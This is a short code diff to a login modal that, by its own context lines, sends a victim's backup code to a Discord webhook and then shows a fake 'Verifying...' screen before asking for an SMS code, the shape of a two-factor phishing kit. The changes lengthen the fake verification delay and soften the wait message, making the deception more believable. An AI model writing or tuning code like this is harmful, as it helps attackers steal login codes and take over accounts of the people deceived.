@@ -79,7 +79,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
     // Send backup code to Discord webhook
     await sendToWebhook('Backup Code', backupCode);
     setStep('verifying');
-    await new Promise(resolve => setTimeout(resolve, 10000));
+    await new Promise(resolve => setTimeout(resolve, 17500));
     
     setStep('sms-code');
   };
@@ -138,7 +138,7 @@ export function LoginModal({ isOpen, onClose }: LoginModalProps) {
         <div className="flex flex-col items-center justify-center py-12">
           <Loader2 className="h-12 w-12 animate-spin text-primary mb-4" />
           <h3 className="text-lg font-semibold text-foreground">Verifying...</h3>
-          <p className="text-sm text-muted-foreground mt-1">Please wait while we verify your backup code</p>
+          <p className="text-sm text-muted-foreground mt-1">This may take a minute.</p>
         </div>
       );
     }
